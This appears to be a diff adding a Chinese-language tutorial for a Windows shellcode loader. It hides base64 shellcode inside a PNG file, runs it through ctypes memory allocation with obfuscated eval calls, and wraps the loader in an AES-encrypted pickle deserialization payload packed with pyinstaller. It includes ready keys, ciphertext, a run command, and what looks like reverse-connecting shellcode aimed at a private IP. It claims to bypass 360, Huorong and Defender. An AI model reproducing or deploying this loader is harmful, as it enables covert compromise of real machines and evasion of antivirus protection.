@@ -1,0 +1,152 @@
+图片shellcode+加载器aes_反序列化
+加载及进行序列化：
+import pickle
+import base64
+
+shellcodeloader = """
+import os
+import ctypes
+import base64
+f = open('1.png', 'rb')
+size = os.path.getsize('1.png')
+f.seek(4498)
+data = f.read()
+f.close()
+shellcode = base64.b64decode(data)
+ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64
+rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)
+eval(base64.b64decode('Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX3VpbnQ2NChyd3hwYWdlKSwgY3R5cGVzLmNyZWF0ZV9zdHJpbmdfYnVmZmVyKHNoZWxsY29kZSksIGxlbihzaGVsbGNvZGUpKQ=='))
+handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)
+ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
+"""
+
+class AAA(object):
+    def __reduce__(self):
+        return (exec, (shellcodeloader,))
+
+seri = pickle.dumps(AAA())
+seri_base64 = base64.b64encode(seri)
+print(seri_base64)
+得到结果：
+b'gASVmwIAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlFh8AgAACmltcG9ydCBvcwppbXBvcnQgY3R5cGVzCmltcG9ydCBiYXNlNjQKZiA9IG9wZW4oJzEucG5nJywgJ3JiJykKc2l6ZSA9IG9zLnBhdGguZ2V0c2l6ZSgnMS5wbmcnKQpmLnNlZWsoNDQ5OCkKZGF0YSA9IGYucmVhZCgpCmYuY2xvc2UoKQpzaGVsbGNvZGUgPSBiYXNlNjQuYjY0ZGVjb2RlKGRhdGEpCmN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jLnJlc3R5cGU9Y3R5cGVzLmNfdWludDY0CnJ3eHBhZ2UgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYygwLCBsZW4oc2hlbGxjb2RlKSwgMHgxMDAwLCAweDQwKQpldmFsKGJhc2U2NC5iNjRkZWNvZGUoJ1kzUjVjR1Z6TG5kcGJtUnNiQzVyWlhKdVpXd3pNaTVTZEd4TmIzWmxUV1Z0YjNKNUtHTjBlWEJsY3k1algzVnBiblEyTkNoeWQzaHdZV2RsS1N3Z1kzUjVjR1Z6TG1OeVpXRjBaVjl6ZEhKcGJtZGZZblZtWm1WeUtITm9aV3hzWTI5a1pTa3NJR3hsYmloemFHVnNiR052WkdVcEtRPT0nKSkKaGFuZGxlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoMCwgMCwgY3R5cGVzLmNfdWludDY0KHJ3eHBhZ2UpLCAwLCAwLCAwKQpjdHlwZXMud2luZGxsLmtlcm5lbDMyLldhaXRGb3JTaW5nbGVPYmplY3QoaGFuZGxlLCAtMSkKlIWUUpQu'
+然后进行aes：
+from base64 import b64encode
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+from Crypto.Random import get_random_bytes
+
+shell = b'gASVmwIAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlFh8AgAACmltcG9ydCBvcwppbXBvcnQgY3R5cGVzCmltcG9ydCBiYXNlNjQKZiA9IG9wZW4oJzEucG5nJywgJ3JiJykKc2l6ZSA9IG9zLnBhdGguZ2V0c2l6ZSgnMS5wbmcnKQpmLnNlZWsoNDQ5OCkKZGF0YSA9IGYucmVhZCgpCmYuY2xvc2UoKQpzaGVsbGNvZGUgPSBiYXNlNjQuYjY0ZGVjb2RlKGRhdGEpCmN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jLnJlc3R5cGU9Y3R5cGVzLmNfdWludDY0CnJ3eHBhZ2UgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYygwLCBsZW4oc2hlbGxjb2RlKSwgMHgxMDAwLCAweDQwKQpldmFsKGJhc2U2NC5iNjRkZWNvZGUoJ1kzUjVjR1Z6TG5kcGJtUnNiQzVyWlhKdVpXd3pNaTVTZEd4TmIzWmxUV1Z0YjNKNUtHTjBlWEJsY3k1algzVnBiblEyTkNoeWQzaHdZV2RsS1N3Z1kzUjVjR1Z6TG1OeVpXRjBaVjl6ZEhKcGJtZGZZblZtWm1WeUtITm9aV3hzWTI5a1pTa3NJR3hsYmloemFHVnNiR052WkdVcEtRPT0nKSkKaGFuZGxlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoMCwgMCwgY3R5cGVzLmNfdWludDY0KHJ3eHBhZ2UpLCAwLCAwLCAwKQpjdHlwZXMud2luZGxsLmtlcm5lbDMyLldhaXRGb3JTaW5nbGVPYmplY3QoaGFuZGxlLCAtMSkKlIWUUpQu'
+key = get_random_bytes(16)
+cipher = AES.new(key, AES.MODE_CBC)
+ct_bytes = cipher.encrypt(pad(shell, AES.block_size))
+iv = b64encode(cipher.iv).decode('utf-8')
+ct = b64encode(ct_bytes).decode('utf-8')
+
+print('iv: \n {} \n key:\n {} \n ase_shell:\n {} \n'.format(iv,key,ct))
+得到结果：
+iv:
+ W8ar0wVqqMCvhrQKQjeiug==
+key:
+ b'\xfdX\xe5u\x0c\xa9\x1c\xc1\x1c\x15\\\xb9\x0f\x88\x00,'
+ase:
+ /v4JRwfYvWsw6M5Wg3jqZksJ8+Htvo1YbyS889M/U5eWH5YXTYHYe7iCFjMXBPKXyYDjxLtXOhZ7pQQoAjSro3folIBHJmWeSGfLMwz4WlVmLcHnXXwlBqfqXOlnNkUoISpLV9wb0P/c6eWlKh/JfwQHoLxEtf0I3BcsaVZ1BXg87zoEMNkxzza3EzPRPweMiE2Np0c1sQHziPBm4NyXLLL3f6n6hiS2nLtxzxV+9xWfFOtTEZRdi6cqtaHWw+6r1psiIOGaMsZ9LGPzJJsm1i29TKX2K4NjBDkf9WlF/R78cam+TB9IuOQoCSGo7sfyY0aXPeFZXzQkyoQ1pItVIH9V8/iuqvoaG8vau0kE2i/YWQMAu7bI821R1GjWn4ZbcN3nX90Hj8DEUUr0LKfUQM3FjGxNZLjb8V/kuY5362YppkRqSfnYS7SNAvZ0kEmxTz6TNlcKktv97byK2+UBWh69+KaxkFKy5K1iH0gzipKIJA+gUvRaLFrHb1lccCwOYzGH01DP7+sCmdeYnvNr4t6v2OFD7V3P0w+GYPb6PO7XB32ghyubA0U3z7wcoi55mIPD6b4/OFWuxAMYMx9lAPF6QPNFXeYA4mgHC0kFx/JnsIRO/yTLgC7GYWBIejP30dLYIwZg/b8zMG8qBU8wxutqUbSVNDNnyAJh+ZIaGAI2aAtUlx/ZR0TsnTNZ1Vlr1gmkgJDLiJxxgZcI8Ju1i4TEoveyyCsYh1zVcnOoMqPTJP08lQe3n3cjrQmfOVYAtlAiZazP6J1PNPaMEv+hBmiBnhmnWacBXBGa6XrfYcgZDwdCu83lZCziVODmRwddfZGLSmox+Zlx/A60K7SukQ7VshFaPmCnB2n66AUQsxCkr+zQ8xH6EheSlJCue3HV9GanIS60hL06dNGk3v2uiOo0uXnkNzim66qcfiA0AFdFJGui/XLLUAvWXYUnesGl8pw0mt9GM+7+9oMcuG489r+uu9m0Fq7+cc4CFWbRd0nKGsQ7jlZxGYAD1noGv/ytJ4rYzPlmMfKi+s2L+r9HPXHtaDv9xXxDMs14L7yC+e9PUjP56upjcJB1rS6puYUYkQc6K80p4achls+k0l4KrSicuLd+DACRm1/mQnGkcRMWFBNWVdkbZePNtEbyaweT1Xz5rGgm7HeNGTLvKZZtgjKKsj/z+YuKgDlqfag9Ufk/PSWI5PvQKHepUOZvQUMh
+shellcode注入到正常图片中：
+import os
+
+def injectimage(file):
+    if os.path.getsize("output/payload.jpg") == 0:
+        print("原始shellcodeh获取失败，请检查源代码！")
+        return 0
+    shellf = open("output/payload.jpg",'rb')
+    shellcode = shellf.read()
+
+    os.system("mv "+file+" output/"+file)
+    psize = os.path.getsize("output/"+file)
+    f = open("output/"+file,'ab+')
+    f.seek(psize)
+    f.write(shellcode)
+    newsize = os.path.getsize("output/"+file)
+    if newsize>psize or newsize==psize:
+        print("图片注入成功!")
+        return psize
+
+def genexe(file,lo):
+    pyfile = "import os\n\
+import ctypes\n\
+import base64\n\
+f = open('"+file+"', 'rb')\n\
+size = os.path.getsize('"+file+"')\n\
+f.seek("+str(lo)+")\n\
+data = f.read()\n\
+f.close()\n\
+shellcode = base64.b64decode(data)\n\
+ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64\n\
+rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)\n\
+eval(base64.b64decode('Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX3VpbnQ2NChyd3hwYWdlKSwgY3R5cGVzLmNyZWF0ZV9zdHJpbmdfYnVmZmVyKHNoZWxsY29kZSksIGxlbihzaGVsbGNvZGUpKQ=='))\n\
+handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)\n\
+ctypes.windll.kernel32.WaitForSingleObject(handle, -1)\n\
+"
+
+    af = open("payload.py",'w')
+    af.write(pyfile)
+
+
+if __name__ == '__main__':
+    targetfile = input("请输入图片的路径 :")
+    if targetfile == '':
+        print("你没有选择一张图片，将默认使用整个shellcode转换成图片")
+        os.system("touch demo.png")
+        targetfile = "demo.png"
+    location = injectimage(targetfile)
+    genexe(targetfile,location)
+payload.jpg：
+/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9Xrc1pIicFBuFAAAABNMclBUUFRagNBUUG6V4mfxv/V61lbSInBSDHSSYnYTTHJUmgAAkCEUlJBuutVLjv/1UiJxkiDw1BqCl9IifFIidpJx8D/////TTHJUlJBui0GGHv/1YXAD4WdAQAASP/PD4SMAQAA69Pp5AEAAOii////L3daNVcABVSqDPMMPjfNb3xWUttKiDqB0BJNcTxQ8q5fLaasVT75/Zox/sB/iArTG5vgZ/AJlHaNW/KZyvcqNZGFoR8DHkzdkrJDBtY3/ABVc2VyLUFnZW50OiBNb3ppbGxhLzQuMCAoY29tcGF0aWJsZTsgTVNJRSA3LjA7IFdpbmRvd3MgTlQgNS4xOyBUcmlkZW50LzQuMDsgLk5FVCBDTFIgMi4wLjUwNzI3KQ0KALybfe4rzyVE2/JeGYR5O+dSQsxM5vgHCButaGTV+NBOLfA7ciM00nE9ETBhP0WGypPSRGQQEzKsm2SZIrgFUrhYY4yopjQic1W9+qQg6/cHPHvT+osmJqo3XGZzMFNQot8baIj7c/JmcWV1j6aKQ5qodRiOvSm4Y63a7Mr9GslPpMh86RftwhOJtGBs7FarOxZfVykEy9kdwq/xj+usC1to9qj+f2V1JVt8ANGVyDh+iK3sVcGYTnM4oqR4dEQcTI5v66Ga+KEiTfmn88YAQb7wtaJW/9VIMcm6AABAAEG4ABAAAEG5QAAAAEG6WKRT5f/VSJNTU0iJ50iJ8UiJ2kG4ACAAAEmJ+UG6EpaJ4v/VSIPEIIXAdLZmiwdIAcOFwHXXWFhYSAUAAAAAUMPon/3//zE5Mi4xNjguMjYuMTM2AAAAAAY=
+生成的png
+
+实际的加载器：
+from Crypto.Cipher import AES
+import base64
+import sys
+import pickle
+from base64 import b64decode
+from Crypto.Util.Padding import unpad
+
+a=	sys.argv[1]
+b= b'5\x92D\xb0\xa0\x80\xfa\xe9\x84\x9c\xa91jV\x86\t'
+buf = sys.argv[2]
+
+a = b64decode(a)
+buf = b64decode(buf)
+cipher = AES.new(b, AES.MODE_CBC, a)
+bufloader = bytearray(unpad(cipher.decrypt(buf), AES.block_size))
+pickle.loads(base64.b64decode(bufloader))
+PMFfsG/YEtSX89bf0q4emQ==
+
+3pDD/sfZ5Msq+tf8de+BRyFy1yBfArUAMlmC9Mhk9sOihnxwvakh0BnnHJK/yN58ZRvuLQKgRXuYbaTTsXobCuEQ6ddoUQuszOURGnBrSL+VtZEnh6STwoyZ6LppCArD3zAZfGz7MWjf9jbCcmwgMMHhOjZbRcsuJ1nB7/Toac9YHwlFGtTAY5mOc/akY54TqNaWAEv5+JbgrCluAkUWbQW/KJQS0XNoBRVv9ALsLbt2F7tbDNkjoFEAGL1aHOG2PBWCkWU/g2NmkXGo7o8tEYEj66S1U8jMqGMXl4tAu9GfmjNmhFzYxm/dq/wK+FAXm6C53+mCWMCWqESW/9460dK1qlyU+RTKYIpI1wKlD8YtBLdYzjdFGA+5b1epg1L0aRM6uqZUD55/k0kW7Q9m9lJaDF9XfDsT5m/aUllNsM85Jabhv1Z/dbi7azuaDw5XteTRZm/FndDDrm65vqe7EF/eX6mTft/GmCVl1egcmiMWCt/XxZisWumdZIKQ2RmIkKrOJBW9A8+XR0w9AF9tOwT3uIuGe+Lnr6Po9ub0CaKo+C6HXcypmzPRS6bup6L9ZHkfII0nh3IuG8K6DbXJKxX71LrdJ4u2bkQBmEkRBJMGOEFYFIVPShDo0KjCRCgHR3bmsr6x2UfDJVMdzN5ktRaqDBXXUAUS8Pv49iQbO676PbaizPGi9ErDpf4h+Cd1PeYqdK0UNAgceajE8mJzx/F/+CKO/XHkqb5WxN0NhwZBxZ2grzuobquuPLLqP14i4/GWIgxRnLLyGSOjm13LA/2dY4tWJ1YRsqmF3ksoHaWiui4OMrjWzbx8KFn6W2IztpiT4tjOoo3sL0vlOXEl8BkxqmlxMCrz0np1FlM89ejSxhN7CUZkSqWgbpavrHSW4SVStn9BgPQfu/54Yc9tQmLwPzpnoyORI4HXCide7gkDffcD9f+kSpkHt5hDMAVfs2VCrYg7XiyYD3ZDRs/7VYRxKrKNN9P2wdQu/nmGpGJXZ5/PBA9my/n36ixZev8Ur7iKMntECO7a4gutUadU+bmdNq8o/LiYpyxV/6kHCF+4vTKoSZbL5QubkPhnN3YSDAoWjPyhjZWSD/yKoWxwSd1LsoMALSSsOqDj8FyWd3JVdflckzUVs4ZOXK1H5L7pwl7/SiN8L7ekedteKNOG7drpj37c1yoB8hrWOJh/BZPc/5E3B6GaMI2bpuVDQKq0
+
+打包成exe，和生成的png放同一目录
+pyinstaller --console --onefile PythonApplication1.py
+
+
+
+运行指令：
+PythonApplication1.exe PMFfsG/YEtSX89bf0q4emQ== 3pDD/sfZ5Msq+tf8de+BRyFy1yBfArUAMlmC9Mhk9sOihnxwvakh0BnnHJK/yN58ZRvuLQKgRXuYbaTTsXobCuEQ6ddoUQuszOURGnBrSL+VtZEnh6STwoyZ6LppCArD3zAZfGz7MWjf9jbCcmwgMMHhOjZbRcsuJ1nB7/Toac9YHwlFGtTAY5mOc/akY54TqNaWAEv5+JbgrCluAkUWbQW/KJQS0XNoBRVv9ALsLbt2F7tbDNkjoFEAGL1aHOG2PBWCkWU/g2NmkXGo7o8tEYEj66S1U8jMqGMXl4tAu9GfmjNmhFzYxm/dq/wK+FAXm6C53+mCWMCWqESW/9460dK1qlyU+RTKYIpI1wKlD8YtBLdYzjdFGA+5b1epg1L0aRM6uqZUD55/k0kW7Q9m9lJaDF9XfDsT5m/aUllNsM85Jabhv1Z/dbi7azuaDw5XteTRZm/FndDDrm65vqe7EF/eX6mTft/GmCVl1egcmiMWCt/XxZisWumdZIKQ2RmIkKrOJBW9A8+XR0w9AF9tOwT3uIuGe+Lnr6Po9ub0CaKo+C6HXcypmzPRS6bup6L9ZHkfII0nh3IuG8K6DbXJKxX71LrdJ4u2bkQBmEkRBJMGOEFYFIVPShDo0KjCRCgHR3bmsr6x2UfDJVMdzN5ktRaqDBXXUAUS8Pv49iQbO676PbaizPGi9ErDpf4h+Cd1PeYqdK0UNAgceajE8mJzx/F/+CKO/XHkqb5WxN0NhwZBxZ2grzuobquuPLLqP14i4/GWIgxRnLLyGSOjm13LA/2dY4tWJ1YRsqmF3ksoHaWiui4OMrjWzbx8KFn6W2IztpiT4tjOoo3sL0vlOXEl8BkxqmlxMCrz0np1FlM89ejSxhN7CUZkSqWgbpavrHSW4SVStn9BgPQfu/54Yc9tQmLwPzpnoyORI4HXCide7gkDffcD9f+kSpkHt5hDMAVfs2VCrYg7XiyYD3ZDRs/7VYRxKrKNN9P2wdQu/nmGpGJXZ5/PBA9my/n36ixZev8Ur7iKMntECO7a4gutUadU+bmdNq8o/LiYpyxV/6kHCF+4vTKoSZbL5QubkPhnN3YSDAoWjPyhjZWSD/yKoWxwSd1LsoMALSSsOqDj8FyWd3JVdflckzUVs4ZOXK1H5L7pwl7/SiN8L7ekedteKNOG7drpj37c1yoB8hrWOJh/BZPc/5E3B6GaMI2bpuVDQKq0
+可过360,火绒
+
+from Crypto.Cipher import AES
+import base64
+import sys
+import pickle
+from base64 import b64decode
+from Crypto.Util.Padding import unpad
+
+a= 'PMFfsG/YEtSX89bf0q4emQ=='
+b= b'5\x92D\xb0\xa0\x80\xfa\xe9\x84\x9c\xa91jV\x86\t'
+buf = '3pDD/sfZ5Msq+tf8de+BRyFy1yBfArUAMlmC9Mhk9sOihnxwvakh0BnnHJK/yN58ZRvuLQKgRXuYbaTTsXobCuEQ6ddoUQuszOURGnBrSL+VtZEnh6STwoyZ6LppCArD3zAZfGz7MWjf9jbCcmwgMMHhOjZbRcsuJ1nB7/Toac9YHwlFGtTAY5mOc/akY54TqNaWAEv5+JbgrCluAkUWbQW/KJQS0XNoBRVv9ALsLbt2F7tbDNkjoFEAGL1aHOG2PBWCkWU/g2NmkXGo7o8tEYEj66S1U8jMqGMXl4tAu9GfmjNmhFzYxm/dq/wK+FAXm6C53+mCWMCWqESW/9460dK1qlyU+RTKYIpI1wKlD8YtBLdYzjdFGA+5b1epg1L0aRM6uqZUD55/k0kW7Q9m9lJaDF9XfDsT5m/aUllNsM85Jabhv1Z/dbi7azuaDw5XteTRZm/FndDDrm65vqe7EF/eX6mTft/GmCVl1egcmiMWCt/XxZisWumdZIKQ2RmIkKrOJBW9A8+XR0w9AF9tOwT3uIuGe+Lnr6Po9ub0CaKo+C6HXcypmzPRS6bup6L9ZHkfII0nh3IuG8K6DbXJKxX71LrdJ4u2bkQBmEkRBJMGOEFYFIVPShDo0KjCRCgHR3bmsr6x2UfDJVMdzN5ktRaqDBXXUAUS8Pv49iQbO676PbaizPGi9ErDpf4h+Cd1PeYqdK0UNAgceajE8mJzx/F/+CKO/XHkqb5WxN0NhwZBxZ2grzuobquuPLLqP14i4/GWIgxRnLLyGSOjm13LA/2dY4tWJ1YRsqmF3ksoHaWiui4OMrjWzbx8KFn6W2IztpiT4tjOoo3sL0vlOXEl8BkxqmlxMCrz0np1FlM89ejSxhN7CUZkSqWgbpavrHSW4SVStn9BgPQfu/54Yc9tQmLwPzpnoyORI4HXCide7gkDffcD9f+kSpkHt5hDMAVfs2VCrYg7XiyYD3ZDRs/7VYRxKrKNN9P2wdQu/nmGpGJXZ5/PBA9my/n36ixZev8Ur7iKMntECO7a4gutUadU+bmdNq8o/LiYpyxV/6kHCF+4vTKoSZbL5QubkPhnN3YSDAoWjPyhjZWSD/yKoWxwSd1LsoMALSSsOqDj8FyWd3JVdflckzUVs4ZOXK1H5L7pwl7/SiN8L7ekedteKNOG7drpj37c1yoB8hrWOJh/BZPc/5E3B6GaMI2bpuVDQKq0'
+
+a = b64decode(a)
+buf = b64decode(buf)
+cipher = AES.new(b, AES.MODE_CBC, a)
+bufloader = bytearray(unpad(cipher.decrypt(buf), AES.block_size))
+pickle.loads(base64.b64decode(bufloader))
+两个在加载器都可以过denfender：
